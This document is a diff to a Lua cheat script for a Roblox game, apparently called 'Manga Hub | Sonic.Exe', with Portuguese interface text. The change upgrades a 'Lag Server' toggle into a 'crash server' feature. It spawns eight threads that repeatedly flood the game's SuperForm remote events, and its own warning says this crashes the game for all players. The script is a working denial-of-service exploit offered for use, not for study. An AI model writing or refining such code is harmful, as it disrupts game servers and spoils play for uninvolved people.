@@ -18,7 +18,7 @@ else
 end
 
 local Window = Fluent:CreateWindow({
-    Title = "Manga Hub | Sonic.Exe | V1.0",
+    Title = "Manga Hub | Sonic.Exe | V2.2",
     SubTitle = "Bem-vindo ao Manga Hub!",
     TabWidth = 120,
     Size = windowSize,
@@ -128,11 +128,11 @@ do
     end)
 
     local lagServerActive = false
-    local lagServerThread = nil
+    local lagServerThreads = {}
 
     local LagServer = Tabs.Teleporte:AddToggle("LagServer", {
-        Title = "Lag Server (Sonic e outros que tem transformação)",
-        Description = "Causa lag no servidor",
+        Title = "crash server",
+        Description = "(AVISO! ativar essa função irá crashar o jogo de TODOS.)",
         Default = false
     })
 
@@ -141,51 +141,60 @@ do
         
         if lagServerActive then
             Fluent:Notify({
-                Title = "Lag Server",
-                Content = "Lag Server ativado!",
+                Title = "Crash Server",
+                Content = "Crash ativado!",
                 Duration = 3
             })
             
-            if lagServerThread then
-                task.cancel(lagServerThread)
-            end
             
-            lagServerThread = task.spawn(function()
-                local player = game:GetService("Players").LocalPlayer
-                local isServerActive = true
-                
-                while lagServerActive and not Fluent.Unloaded do
-                    pcall(function()
-                        local gui = player.PlayerGui
-                        if gui and gui:FindFirstChild("Client") then
-                            local superForm = gui.Client:FindFirstChild("Abbilities") 
-                                and gui.Client.Abbilities:FindFirstChild("SuperForm")
-                            
-                            if superForm then
-                                if isServerActive and superForm:FindFirstChild("Server") then
-                                    superForm.Server:FireServer(player)
-                                elseif not isServerActive and superForm:FindFirstChild("UnServer") then
-                                    superForm.UnServer:FireServer(player)
-                                end
-                                isServerActive = not isServerActive
-                            end
-                        end
-                    end)
+            for _, thread in ipairs(lagServerThreads) do
+                if thread then task.cancel(thread) end
+            end
+            lagServerThreads = {}
+            
+            
+            for i = 1, 8 do
+                table.insert(lagServerThreads, task.spawn(function()
+                    local player = game:GetService("Players").LocalPlayer
+                    local isServerActive = true
                     
-                    task.wait()
-                end
-            end)
+                    while lagServerActive and not Fluent.Unloaded do
+                        pcall(function()
+                            local gui = player.PlayerGui
+                            if gui and gui:FindFirstChild("Client") then
+                                local superForm = gui.Client:FindFirstChild("Abbilities") 
+                                    and gui.Client.Abbilities:FindFirstChild("SuperForm")
+                                
+                                if superForm then
+                                    
+                                    for _ = 1, 20 do
+                                        if not lagServerActive then break end
+                                        if isServerActive and superForm:FindFirstChild("Server") then
+                                            superForm.Server:FireServer(player)
+                                        elseif not isServerActive and superForm:FindFirstChild("UnServer") then
+                                            superForm.UnServer:FireServer(player)
+                                        end
+                                    end
+                                    isServerActive = not isServerActive
+                                end
+                            end
+                        end)
+                        
+                        task.wait() 
+                    end
+                end))
+            end
         else
             lagServerActive = false
             
-            if lagServerThread then
-                task.cancel(lagServerThread)
-                lagServerThread = nil
+            for _, thread in ipairs(lagServerThreads) do
+                if thread then task.cancel(thread) end
             end
+            lagServerThreads = {}
             
             Fluent:Notify({
-                Title = "Lag Server",
-                Content = "Lag Server desativado!",
+                Title = "Crash Server",
+                Content = "Crash Server desativado!",
                 Duration = 3
             })
         end
@@ -208,7 +217,7 @@ Window:SelectTab(1)
 
 Fluent:Notify({
     Title = "Manga Hub - Sonic.Exe",
-    Content = "Script carregado!",
+    Content = "Script carregado! Lag Server agora é ULTRA (8 threads)",
     Duration = 8
 })
 
